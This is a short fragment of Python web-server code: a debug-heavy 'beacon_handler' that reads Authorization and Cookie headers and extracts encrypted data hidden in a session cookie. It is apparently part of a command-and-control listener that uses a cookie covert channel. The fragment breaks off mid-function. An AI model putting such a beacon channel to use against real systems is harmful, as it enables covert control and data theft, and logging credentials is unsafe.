...
def beacon_handler():
    try:
        print('[DEBUG] beacon_handler called')
        print(f'[DEBUG] Authorization: {request.headers.get("Authorization", "")}')
        print(f'[DEBUG] Cookie header: {request.headers.get("Cookie", "")[:100]}')
        
        # Debug extract_data_from_cookie
        cookie_header = request.headers.get('Cookie', '')
        print(f'[DEBUG] Looking for session cookie...')
        if 'session=' in cookie_header:
            encoded = cookie_header.split('session=')[1].split(';')[0]
            print(f'[DEBUG] Found session cookie: {encoded[:50]}...')
        else:
            print('[DEBUG] No session cookie found!')

        encrypted = extract_data_from_cookie(request)
        print(f'[DEBUG] extract_data_from_cookie returned: {encrypted}')
        if encrypted:
            print(f'[DEBUG] Encrypted data length: {len(encrypted)}')
            print(f'[DEBUG] Encrypted data (first 50): {encrypted[:50]}')
